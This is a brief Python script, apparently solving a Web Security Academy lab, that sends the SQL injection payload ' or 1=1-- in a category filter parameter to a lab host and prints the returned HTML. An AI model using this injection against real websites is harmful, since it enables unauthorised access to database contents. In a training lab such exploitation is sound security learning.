import requests

response = requests.get(
    'https://0acc007b0487f86c829e15e500ed0060.web-security-academy.net/filter?category=Pets%27%20or%201=1--',
)

print(response.text)  # Shows the page's HTML source
